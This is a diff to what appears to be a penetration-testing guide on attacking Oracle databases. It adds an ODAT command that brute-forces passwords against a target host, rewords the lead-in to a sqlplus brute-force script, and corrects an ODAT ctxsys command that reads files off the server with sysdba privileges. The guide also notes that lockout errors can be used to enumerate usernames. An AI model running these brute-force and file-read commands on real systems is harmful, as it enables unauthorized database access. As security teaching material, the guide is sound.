@@ -28,7 +28,7 @@ The SID for Oracle identifies the database instance running.  We can use ODAT to
 
 ## Username Brute-force
 
-Generally usernames are not case-sensitive in older Oracle databases, but as of [11g](http://planet.openbravo.com/blog/aware-oracle-11g-login-is-case-sensitive/) this is not the case.  Also they are typically subject to an account lockout on too many password attempts ranging from 5 to 10, as we can see here:
+Generally usernames and passwords are not case-sensitive in older Oracle databases, but as of [11g](http://planet.openbravo.com/blog/aware-oracle-11g-login-is-case-sensitive/) this is not the case.  Also they are typically subject to an account lockout on too many password attempts ranging from 5 to 10, as we can see here:
 
 ```
 string = SYSTEM:0RACLE
@@ -41,7 +41,13 @@ ORA-28000: the account is locked
 
 Lucky for us it will tell us and could be used as a very basic username enumeration method if you're really really desperate.  I'm joking, don't do that. Do not do that!
 
-The following bash script can perform a dirty manual brute-force using sqlplus, so it's important to adjust your path's in this one accordingly:
+We can again use ODAT to brute-force passwords:
+
+```bash
+./odat.py passwordguesser -s 192.168.0.5 -d ORCL --accounts-file accounts/accounts_multiple.txt
+```
+
+The following bash script can perform a dirty manual brute-force using sqlplus, so be sure to adjust the path's in this one accordingly:
 
 ```bash
 #!/bin/bash
@@ -78,7 +84,7 @@ I've found the `externaltable` to give the best results in cases like these:
 However, do note that `ctxsys` can do the same, but all results are transformed to upper case:
 
 ```
-./odat.py ctxsys --getFile 'C:\\Users\\Booj\\Desktop\\evil.jpg' -s 192.168.0.5 -d ORCL -U username -P password--sysdba
+./odat.py ctxsys --getFile 'C:\\Users\\Booj\\Desktop\\evil.jpg' -s 192.168.0.5 -d ORCL -U username -P password --sysdba
 ```
 
 ## CVE 2012-1675 \(TNS Poisoning\)
